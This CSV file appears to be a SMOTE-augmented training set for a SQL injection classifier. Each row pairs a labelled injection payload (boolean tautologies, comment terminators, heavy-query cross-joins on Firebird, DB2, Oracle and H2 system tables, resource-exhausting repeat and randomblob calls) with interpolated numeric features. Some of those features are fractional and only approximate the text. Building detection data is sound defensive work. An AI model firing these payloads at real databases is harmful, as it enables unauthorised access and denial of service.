id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000297,0.33305654439961335,59.5526836341608,26.110536726832162,3.9839859027868134,18.0,17.0,17.44214690732865,7.11053672683216,0.302450130981225,0.2856473459267125,0.29255589135372256,0.11934663173834001,1.1105367268321613,0.0,1.7789265463356776,0.0,0.0,2.0,0.0,1.1105367268321604,0.0,-1.1102230246251565e-16,0.0,4.889463273167839,1.0,0.0,0.8894632731678387,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,boolean,"1%""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000311,0.36254884367823365,222.99697336876397,33.333165187153554,3.5639265705161525,58.582030200440045,27.0,98.49873890365166,38.916204264672274,0.26164383851585327,0.12184206973105055,0.44186240330858145,0.17465168844451473,0.0,3.9999999999999996,0.0,0.0,0.0,1.9167087032116117,0.0,20.66633037430711,1.833417406423223,1.0832912967883883,3.0832912967883885,8.249873890365166,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.166582593576776,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.166582593576777
SMOTE_000013,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000151,0.21013192002972603,70.18640498196629,26.349123985573026,3.666584151408593,11.349123985573023,16.0,28.0,14.837280996393257,0.1612357966692466,0.22813007261812623,0.3992276270817209,0.2114065036309063,4.0,0.0,1.0,0.0,0.0,2.0,0.0,4.0,2.0,0.8372809963932563,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000014,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000089,0.18755815091843067,128.67050630924498,31.15186420993136,4.226448738375509,72.13898157448521,9.0,33.30372841986272,14.227796314897043,0.56043147027444,0.07007162940425911,0.2589677535865075,0.11052914673479336,1.2277963148970428,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,-1.1102230246251565e-16,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.07593210496568104,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.075932104965681
SMOTE_000015,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000132,0.33680224692952004,70.37846967987319,26.0,3.80594950694017,14.873843440042265,21.378469679873202,24.000000000000004,10.126156559957735,0.21144657448236015,0.30362916131385265,0.34107959445852115,0.14384466974526602,0.0,1.0,2.1261565599577343,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,4.126156559957734,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.8738434400422654,0.12615655995773456,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000016,attack,boolean,-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,nearest_attack_euclidean,R000254,0.05592021554062882,68.91179650940198,23.955898254700983,3.580379955556497,12.882395345869298,16.0,28.0,12.029401163532675,0.18680283511450557,0.23220870850001576,0.4063652398750276,0.17462321651045112,4.0,0.0,1.0,0.0,1.0,2.0,0.0,4.0,0.029401163532676744,-1.1102230246251565e-16,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000017,attack,boolean,"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000306,0.9907923601965025,136.2932327303033,29.376775219304193,3.9826649563990677,72.6883876096521,11.09774424343443,39.13032565791258,13.376775219304191,0.5371874665018908,0.07930604648091553,0.28578015200911555,0.09772633500807817,0.0,0.0,0.0,0.0,1.0,1.3441938048260478,0.0,5.344193804826048,0.0,-1.1102230246251565e-16,2.3441938048260478,2.344193804826048,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.344193804826048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.344193804826048
SMOTE_000018,attack,boolean,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,nearest_attack_euclidean,R000037,1.628449742331073,46.048011329438054,17.16861887059632,3.370679654275168,11.252928305894486,17.0,15.252928305894478,2.5421547176490833,0.23988171266981284,0.3768164730767028,0.3285444122172723,0.054757402036212044,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.5421547176490797,0.0,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.5421547176490802,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000019,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000232,0.5467447395257535,129.55670238728243,31.0,4.013989201132761,63.0,10.0,36.223166671879646,20.333535715402782,0.48831983427298076,0.07751108480523503,0.2773042376666378,0.15686484325514644,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.333535715402781,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,boolean,-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,nearest_attack_euclidean,R000029,1.4733506749849292,45.0,23.382050813551935,4.109670976662841,17.0,12.0,10.0,6.0,0.37777777777777777,0.26666666666666666,0.2222222222222222,0.13333333333333333,2.7641016271038716,1.2358983728961281,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,2.0,0.6910254067759679,0.3089745932240321,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000021,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000121,0.40552717183070874,70.6069770033865,23.339302299661348,3.719192310672972,21.0,13.0,25.2855816027092,11.3213954006773,0.2988288604157271,0.18498929454306917,0.35602569309663407,0.16015615194456972,4.0,0.0,0.0,0.0,0.0,2.0,0.0,3.321395400677299,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000022,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000053,0.9768477423924085,136.12996274707055,32.0,4.213893387110921,73.43501862646472,9.0,37.52120809045437,16.173736030151456,0.5402927676259541,0.0661670311564211,0.2749374469487566,0.1186027542688682,0.0,0.39124534338381894,2.0,0.0,1.0,1.0,0.0,4.7824906867676376,0.0,-1.1102230246251565e-16,3.0,4.0,0.0,0.3912453433838189,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000023,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",nearest_attack_euclidean,R000124,0.9681686213686468,138.56071661201298,31.395635179112556,4.181156665666999,81.18690553733767,5.582540716450218,35.791270358225105,16.0,0.586181837375491,0.03988683797699216,0.2583434370853876,0.11558788756212923,3.3956351791125545,0.0,0.0,0.0,1.0,1.3956351791125545,0.0,4.0,0.0,-1.1102230246251565e-16,2.6043648208874455,2.3956351791125545,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.3956351791125545,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3956351791125545
SMOTE_000024,attack,boolean,"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",nearest_attack_euclidean,R000308,1.0795590216151696,282.7306746011649,37.21618363444259,3.685323220985546,84.8381636555741,28.729469075540713,121.24396004226304,47.91908182778705,0.2999821746893741,0.10233016167952907,0.4282065404906473,0.16948112314044952,0.0,3.3514490966722312,0.43236726888517896,0.0,0.0,1.2161836344425894,0.0,26.919081827787053,0.0,2.0,4.0,11.648550903327768,0.0,1.0,0.21618363444258948,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.21618363444258948,0.0,1.7838163655574104,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000025,attack,boolean,"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000264,0.34499303483075505,140.83264023862296,31.06866822125747,3.3610222920858357,35.20600466377242,14.656658893712638,67.2446495661678,23.72532711497011,0.2504287466988101,0.10387357517339998,0.47730257477011073,0.16839510335767913,5.72532711497011,0.20600466377241744,0.0,1.0,0.0,1.9313317787425275,0.0,11.931331778742528,1.9313317787425275,-1.1102230246251565e-16,1.0,2.9313317787425275,1.0,0.06866822125747254,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.06866822125747252,0.0,0.0,0.0,1.9313317787425275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000026,attack,boolean,select * from users where id  =  1.<@$ or 1  =  1 -- 1,nearest_attack_euclidean,R000018,0.9842620960501576,55.91067048289382,22.522332379276545,3.6980997352948104,24.95533524144691,4.477667620723453,17.95533524144691,8.522332379276545,0.44627458858514735,0.07986953051963323,0.32091529528382445,0.15294058561139495,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.4776676207234551,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.477667620723455
SMOTE_000027,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000187,0.8581389253621243,60.91434548990367,22.809424183493885,3.6747081798536803,15.44753934679511,17.0,21.466806143108563,7.0,0.2544960641450643,0.27923896300482165,0.3512842233775404,0.11498074947257363,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.6381151633012232,0.0,-1.1102230246251565e-16,0.0,4.361884836698777,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.36188483669877686,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3618848366987772
SMOTE_000028,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000237,1.4196578687383932,126.6971040109499,29.053034500342186,3.7644263384130285,50.954621006159314,16.0,46.58337950376403,13.159103501026554,0.3909644836122471,0.13511720675466077,0.3693483770609416,0.10456993257215057,0.0,0.0,0.0,0.0,1.0,1.5265172501710922,0.0,7.053034500342184,0.0,0.47348274982890776,1.5265172501710922,2.526517250171092,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.526517250171092,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.526517250171092
